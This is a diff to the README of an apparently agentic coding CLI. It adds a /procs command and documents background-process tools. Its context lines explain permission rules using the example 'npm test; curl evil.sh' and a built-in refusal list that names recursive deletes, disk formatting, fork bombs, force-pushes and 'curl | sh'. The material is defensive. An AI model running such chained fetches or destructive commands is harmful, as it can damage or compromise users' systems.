@@ -135,6 +135,7 @@ Prefer your terminal's own scrollback? Run `amness --inline` (or set `ui: "inlin
 | `/loop` (alias `/trace`) | step-by-step trace of the agent loop: each model turn, its tools and timings, and any guard that fired |
 | `/tokens` (alias `/cost`) | context gauge, what fills it, tokens, cache hits, estimated cost |
 | `/memory` · `/init` | list notes · `forget` `add` `stale` `prune` `consolidate` `graph` `embeddings` · have the agent write `AGENTS.md` |
+| `/procs` | background processes the agent started (`/procs stop <id>`) |
 | `/hooks` · `/permissions` | lifecycle hooks in effect · permission rules (list, or `allow`/`ask`/`deny <rule>`) |
 | `/copy` | copy the last reply (`/copy code`, `/copy all`) |
 | `/keepwarm [on\|off]` | keep the Claude prompt cache alive while you are away (opt-in) |
@@ -152,6 +153,8 @@ Prefer your terminal's own scrollback? Run `amness --inline` (or set `ui: "inlin
 ```
 
 Precedence: **built-in floor > deny > ask > allow > the permission mode.** Shell rules match each piece of a compound command (`a && b | c`) separately, so `npm test; curl evil.sh` is not covered by an `npm test*` allow rule, and a command with a subshell or backticks never matches an allow rule. Paths are relative to the project. The **floor holds in every mode, yolo included**: recursive deletes of `/`, your home folder or a parent folder, formatting or writing to disks, fork bombs, force-pushes to main or master, and edits to `.git/` or to these rule and hook files are refused (the agent cannot rewrite its own policy), and `curl | sh` and force-pushes always ask. Allow rules in a project file are only honoured after you approve that exact file (deny and ask rules always apply, since they only restrict). The approval dialog can save a rule ("always allow `npm *` in this project"), and `/permissions` lists rules or adds one (`/permissions deny sh(git push*)`).
+
+**Background processes.** `sh` waits for a command to finish, so servers and watchers use four more tools: `sh_start` (returns an id; same permission rules as `sh`), `sh_read` (new output since the last read, optionally waiting up to 10 s), `sh_stop` (SIGTERM, then SIGKILL; the whole process group) and `sh_list`. Output is kept in a 200 KB ring buffer, at most 5 run at once, plan mode hides `sh_start`, and everything is killed when you exit. The sidebar lists running processes and `/procs` shows or stops them.
 
 **Tracing.** Every loop event (turns with token and cache counts, tool calls with timings, hooks, cache breaks, trims) is written to `.amness/traces/<session>.jsonl`, one JSON line each, so a bad session can be read with `grep` and `jq`. Set `AMNESS_OTLP=http://localhost:4318` (or any OTLP/HTTP collector) to also export OpenTelemetry spans with GenAI attributes (`gen_ai.usage.input_tokens`, `gen_ai.usage.cache_read.input_tokens`, `gen_ai.tool.name`); headless runs take `--trace <file>`. `/loop` shows how many tokens were re-read at full price after cache breaks, with an estimated cost. A full disk or an unreachable collector never stops the agent.
 
